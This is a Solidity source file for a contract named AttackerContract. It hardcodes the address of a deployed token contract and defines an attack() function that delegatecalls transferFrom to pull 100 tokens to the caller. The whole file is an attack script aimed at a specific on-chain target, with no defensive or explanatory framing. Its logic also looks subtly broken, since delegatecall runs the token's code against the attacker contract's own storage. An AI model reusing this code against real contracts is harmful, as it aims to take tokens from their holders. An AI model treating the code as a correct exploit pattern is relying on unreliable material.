// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.7;

interface EXMToken {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract AttackerContract {
    EXMToken public tokenContract;
    address public exmTokenAddress;

   constructor() {
    exmTokenAddress = 0x6276dea68C8A9bB688813687605663E7a28eb48c;
    tokenContract = EXMToken(exmTokenAddress);
    }

    function attack() public {
        bytes memory data = abi.encodeWithSignature("transferFrom(address,address,uint256)", exmTokenAddress, msg.sender, 100);
        (bool success, ) = address(exmTokenAddress).delegatecall(data);
        require(success, "Delegatecall failed");
    }
}